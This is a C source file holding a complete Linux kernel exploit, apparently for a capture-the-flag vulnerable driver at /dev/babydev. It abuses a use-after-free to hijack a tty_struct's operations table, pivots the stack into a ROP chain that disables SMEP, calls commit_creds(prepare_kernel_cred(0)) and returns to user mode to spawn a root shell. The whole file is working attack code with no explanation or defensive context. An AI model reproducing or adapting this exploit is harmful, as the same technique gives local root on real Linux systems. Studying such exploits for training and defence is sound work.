#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define prepare_kernel_cred_addr 0xffffffff810a1810
#define commit_creds_addr 0xffffffff810a1420

void* fake_tty_operations[30];

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*]status has been saved.");
}


void get_shell()
{
    system("/bin/sh");
}

void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}
int main()
{
    save_status();

	int i = 0;
    size_t rop[32] = {0};
    rop[i++] = 0xffffffff810d238d;		// pop rdi; ret;
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80;		// mov cr4, rdi; pop rbp; ret;
    rop[i++] = 0;
    rop[i++] = (size_t)get_root;
    rop[i++] = 0xffffffff81063694;		// swapgs; pop rbp; ret;
    rop[i++] = 0;
    rop[i++] = 0xffffffff814e35ef;		// iretq; ret;
    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;                /* saved CS */
    rop[i++] = user_rflags;            /* saved EFLAGS */
    rop[i++] = user_sp;
    rop[i++] = user_ss;

	for(int i = 0; i < 30; i++)
	{
		fake_tty_operations[i] = 0xFFFFFFFF8181BFC5; 
	}
    fake_tty_operations[0] = 0xffffffff810635f5;  //pop rax; pop rbp; ret;
    fake_tty_operations[1] = (size_t)rop;
    fake_tty_operations[3] = 0xFFFFFFFF8181BFC5;  // mov rsp,rax ; dec ebx ; ret

    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);

    int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    size_t fake_tty_struct[4] = {0};
    read(fd2, fake_tty_struct, 32);
    fake_tty_struct[3] = (size_t)fake_tty_operations;
    write(fd2,fake_tty_struct, 32);

    char buf[0x8] = {0};
    write(fd_tty, buf, 8);

    return 0;
}
